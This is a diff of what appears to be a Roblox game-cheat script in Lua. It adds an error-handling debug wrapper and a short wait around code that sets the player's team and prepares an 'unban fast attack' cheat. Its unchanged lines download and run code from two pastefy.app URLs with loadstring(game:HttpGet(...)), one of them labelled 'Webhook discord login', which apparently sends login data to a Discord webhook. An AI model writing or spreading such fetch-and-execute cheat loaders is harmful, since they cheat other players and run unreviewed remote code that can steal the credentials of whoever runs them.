@@ -1,3 +1,19 @@
+-- Debug Wrapper
+local function RunWithDebug(func)
+    local function ErrorHandler(err)
+        warn("========== SCRIPT ERROR ==========")
+        warn("Error:", err)
+        warn("Stack Trace:")
+        warn(debug.traceback())
+        warn("==================================")
+    end
+
+    local ok = xpcall(func, ErrorHandler)
+
+    if ok then
+        print("Script executed successfully!")
+    end
+end
 loadstring(game:HttpGet("https://pastefy.app/AM25eAps/raw"))()
 --Webhook discord login
 loadstring(game:HttpGet'https://pastefy.app/3S6JPfFI/raw')()
@@ -9,7 +25,7 @@ if not game:IsLoaded() then
 end
 
 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam", "Marines")
-
+task.wait(3)
 --unban fast attack
 local RS=game.ReplicatedStorage
 local N=require(RS.Modules.Net)
